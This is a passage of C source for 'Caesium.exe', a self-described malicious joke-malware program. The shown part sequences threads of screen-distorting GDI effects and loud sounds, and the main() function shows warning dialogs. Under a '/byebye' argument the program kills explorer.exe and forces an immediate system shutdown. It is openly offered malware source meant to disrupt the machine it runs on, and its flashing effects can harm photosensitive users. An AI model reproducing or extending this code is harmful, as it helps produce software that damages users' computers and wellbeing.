	TerminateThread(payload11_num1, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload12 = CreateThread(NULL, 0, shader8, NULL, 0, NULL);
	sound12();
	TerminateThread(payload12, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload13 = CreateThread(NULL, 0, shader9, NULL, 0, NULL);
	sound13();
	TerminateThread(payload13, 0);
	TerminateThread(payload6_num2, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload14_num1 = CreateThread(NULL, 0, shader10, NULL, 0, NULL);
	HANDLE payload14_num2 = CreateThread(NULL, 0, text2, NULL, 0, NULL);
	sound14();
	TerminateThread(payload14_num1, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload15_num1 = CreateThread(NULL, 0, eyeeeeeeeeeeeeeeeeeeeeeee, NULL, 0, NULL);
	HANDLE payload15_num2 = CreateThread(NULL, 0, bitblt4, NULL, 0, NULL);
	sound15();
	TerminateThread(payload15_num1, 0);
	TerminateThread(payload15_num2, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload16 = CreateThread(NULL, 0, shader11, NULL, 0, NULL);
	sound16();
	TerminateThread(payload16, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload17 = CreateThread(NULL, 0, shader12, NULL, 0, NULL);
	sound17();
	TerminateThread(payload17, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload18 = CreateThread(0, 0, shader13, 0, 0, 0);//プログラムの強烈なラストキル
	sound18();                                                                             
	TerminateThread(payload18, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload19 = CreateThread(NULL, 0, trianglez, NULL, 0, NULL);
	sound19();
	TerminateThread(payload1_num4, 0);
	TerminateThread(payload11_num2, 0);
	TerminateThread(payload14_num2, 0);
	TerminateThread(payload19, 0);
	refreshscr();
	Sleep(100);
	HANDLE payload20 = CreateThread(NULL, 0, blueeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee, NULL, 0, NULL);
	sound20();
	TerminateThread(payload20, 0);
	refreshscr();
	Sleep(100);
	TerminateThread(payload00, 0);
	TerminateThread(payload0, 0);
}
int main()
{
	int argc;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	InitDPI();
	switch (argc) {
	case 1: {
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"First warning\r\n\If you don't know what this is, please exit this program immediately and delete it. \r\n\This is a malicious software called Caesium(Peaceful Version) that can only run on a relatively secure environment such as Windows Sandbox or VMware, created by LambdaTechnology and Coder-Linjian. \r\n\This malicious software contains many flashing lights and loud sounds. Running this software may cause unnecessary trouble. Because it has enough capability to delete all your files, making your computer useless. \r\n\Please make your choice, run or exit? \r\n\If you accidentally opened it, press' No 'to exit. If you agree to the above terms and are ready to face death, press' yes' to proceed.", L"'We are all in the gutter, but some of us are looking at the stars......'", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			if (MessageBoxW(NULL, L"FINAL WARNING\r\n\If the above choices were made due to your haste, please press' No 'immediately to exit. \r\n\Otherwise, the authors(LambdaTechnology and Coder-Linjian) will not be held responsible for any liability caused by this malicious software.", L"'Don't do that, I don't want to go die!'Says your PC.", MB_YESNO | MB_ICONWARNING) == IDNO)
			{
				ExitProcess(0);
			}
			else
			{
				mainpayloads();
			}
		}
	}
		  break;
	case 2: {
		if (!lstrcmpW(argv[1], L"/byebye")) {
			CREATE_NO_WINDOW;
			if (MessageBoxW(NULL, L"If you don't know what this is, please exit this program immediately and delete it. \r\n\This is a malicious software called Caesium(Peaceful Version) that can only run on a relatively secure environment such as Windows Sandbox or VMware, created by LambdaTechnology and Coder-Linjian. \r\n\This malicious software contains many flashing lights and loud sounds. Running this software may cause unnecessary trouble. Because it has enough capability to delete all your files, making your computer useless. \r\n\Please make your choice, run or exit? \r\n\If you accidentally opened it, press' No 'to exit. If you agree to the above terms and are ready to face death, press' yes' to proceed.", L"'We are all in the gutter, but some of us are looking at the stars......'", MB_YESNO | MB_ICONWARNING) == IDNO)
			{
				ExitProcess(0);
			}
			else
			{
				if (MessageBoxW(NULL, L"This is the final warning. If the above choices were made due to your haste, please press' No 'immediately to exit. \r\n\Otherwise, the authors(LambdaTechnology and Coder-Linjian) will not be held responsible for any liability caused by this malicious software.", L"'Don't do that, I don't want to go die!'Says your PC.", MB_YESNO | MB_ICONWARNING) == IDNO)
				{
					ExitProcess(0);
				}
				else
				{
					mainpayloads();
					system("taskkill /f /im explorer.exe");
					if (MessageBoxW(NULL, L"GoodBye,World.", L"Caesium.exe--fatal error", MB_OK | MB_ICONERROR) == IDOK)
					{
						system("shutdown -s -t 0");
					}
					else
					{
						system("shutdown -s -t 0");

					}

				}
			}
		}
		else {
			if (!lstrcmpW(argv[1], L"/nomsgbox")) {
				mainpayloads();
			}
			else {
					if (!lstrcmpW(argv[1], L"/easteregg")) {
						if (MessageBoxW(NULL, L"You found the easter egg!", L"Caesium.exe--easteregg", MB_OK | MB_ICONINFORMATION) == IDOK) {
							if (MessageBoxW(NULL, L"N17Pro3426 is a skidder, having copied nearly a hundred programmes, which is illegal criminal behaviour in every country.\r\n\His act of skidding is wrong, we must resist it.\r\n\However, the author(LambdaTechnology)doesn't have a YouTube account, but the secondary creation program of n17pro3426 allows people who are not familiar with the program I wrote to have a preliminary understanding of it.\r\n\However, he did not have the original author's consent when reworking my program, which is also wrong.\r\n\So, although his skidding was wrong, it helped my programme spread better to the external network. Therefore, n17pro3426 has both good and bad aspects, We need to judge his behaviour rationally.", L"Caesium.exe--easteregg", MB_OK | MB_ICONINFORMATION) == IDOK) {
								ExitProcess(0);
							}
							else {
								ExitProcess(0);
							}
						}
						else {
							ExitProcess(0);
						}
					}
					else
						if (!lstrcmpW(argv[1], L"/about")) {
							if (MessageBoxW(NULL, L"Caesium.exe\r\n\made by LambdaTechnology&Coder-linjian\r\n\(NOSKID)", L"Caesium.exe--about", MB_OK | MB_ICONINFORMATION) == IDOK) {
								ExitProcess(0);
							}
							else {
								ExitProcess(0);
							}
						}
						else {
							if (!lstrcmpW(argv[1], L"/help")) {
								if (MessageBoxW(NULL, L"Caesium.exe\r\n\Version 1.0 (Official Version)\r\n\r\nCopyright(C) 2025 LambdaTechnology.All rights reserved.\r\n\Caesium.exe and its source code are protected.No copying or spreading any parts of or all of source code of this program without allowance!\r\n\r\n\To learn more, please visit \r\n\https://github.com/lambdaexec\r\n\https://gitcode.com/lambdaexec\r\n\https://space.bilibili.com/3546842902038662 \r\n\lambdaexe114@foxmail.com", L"Caesium.exe--help", MB_OK | MB_ICONINFORMATION) == IDOK) {
									ExitProcess(0);
								}
								else {
									ExitProcess(0);
								}
							}
							else {
								if (MessageBoxW(NULL, L"Invalid argument! Please use a valid argument and try it again!", L"Caesium.exe--argument error", MB_OK | MB_ICONERROR) == IDOK) {
									ExitProcess(0);
								}
							}
						}
			}
		}
	}
		  break;
	default: {
		if (MessageBoxW(NULL, L"Invalid argument! Please use a valid argument and try it again!", L"Caesium.exe--argument error", MB_OK | MB_ICONERROR) == IDOK) {
			ExitProcess(0);
		}
	}
		   break;
	}
}